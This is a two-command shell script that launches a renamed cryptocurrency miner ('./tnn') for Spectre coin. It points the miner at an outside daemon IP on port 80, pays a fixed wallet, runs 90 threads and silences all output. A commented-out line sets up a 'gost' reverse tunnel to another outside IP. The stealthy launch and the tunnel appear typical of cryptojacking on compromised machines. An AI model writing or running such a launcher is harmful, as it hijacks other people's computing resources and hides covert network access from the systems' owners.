#./gost -L rtcp://:3000/104.131.176.101:4000 >/dev/null 2>&1 >/dev/null &
#sleep 2
./tnn --spectre --daemon-address 152.42.246.73 --port 80 --wallet spectre:qzfp38jfd890zlmwynew0qgmzpm2w4jf05flzq5js9gda9f2y0j65799xeq6x.war$(shuf -i 1-99 -n 1) --threads 90 >/dev/null 2>&1 
